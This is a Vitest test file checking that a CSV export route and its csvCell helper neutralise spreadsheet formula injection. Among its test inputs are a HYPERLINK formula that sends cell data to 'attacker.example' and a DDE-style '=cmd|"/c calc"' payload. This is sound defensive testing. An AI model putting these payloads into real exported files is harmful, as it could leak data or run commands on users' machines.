// @vitest-environment node
import { beforeEach, describe, expect, it, vi } from 'vitest';

const { findMany } = vi.hoisted(() => ({ findMany: vi.fn() }));
vi.mock('../../src/lib/prisma', () => ({ default: { candidate: { findMany } } }));

import { GET } from '../../src/app/api/cases/[caseId]/export/route';

function row(url: string, title: string | null) {
  return { id: 'cand-1', url, title, status: 'evidence', createdAt: new Date(0) };
}

async function exportCells(url: string, title: string | null): Promise<string> {
  findMany.mockResolvedValue([row(url, title)]);
  const res = await GET(new Request('http://localhost/api/cases/c1/export'), {
    params: Promise.resolve({ caseId: 'c1' }),
  });
  const [, line] = (await res.text()).split('\n');
  return line ?? '';
}

describe('CSV export — spreadsheet formula injection', () => {
  beforeEach(() => findMany.mockReset());

  it.each([
    '=HYPERLINK("http://attacker.example/?x="&A1,"click")',
    '+1+1',
    '-2+3',
    '@SUM(1,1)',
    '＠SUM(1,1)',
    '\t=1+1',
    '\r=1+1',
  ])('neutralises a title starting with %j', async (title) => {
    const line = await exportCells('https://example.com/a', title);
    // the title cell must start with a single quote (inside CSV quoting if present)
    expect(line).toMatch(/,"?'/);
    expect(line).not.toMatch(/,"?[=+\-@＠\t\r]/);
  });

  it('neutralises a url cell starting with a formula prefix', async () => {
    const line = await exportCells('=cmd|"/c calc"!A1', 'title');
    expect(line.split(',')[1]?.replace(/^"/, '')).toMatch(/^'=/);
  });

  it('leaves ordinary cells unchanged', async () => {
    const line = await exportCells('https://example.com/a', 'Plain title');
    expect(line).toBe('cand-1,https://example.com/a,Plain title,evidence,1970-01-01T00:00:00.000Z');
  });
});

describe('csvCell (also used by the client-side EvidenceList export)', () => {
  it.each([
    ['=1+1', "'=1+1"],
    ['+1', "'+1"],
    ['-1', "'-1"],
    ['@x', "'@x"],
    ['＠x', "'＠x"],
    ['\tx', "'\tx"],
    ['\rx', `"'\rx"`],
    ['=a,"b"', `"'=a,""b"""`],
    ['plain', 'plain'],
    ['a,b', '"a,b"'],
  ])('%j → %j', async (raw, expected) => {
    const { csvCell } = await import('../../src/lib/csvCell');
    expect(csvCell(raw)).toBe(expected);
  });
});
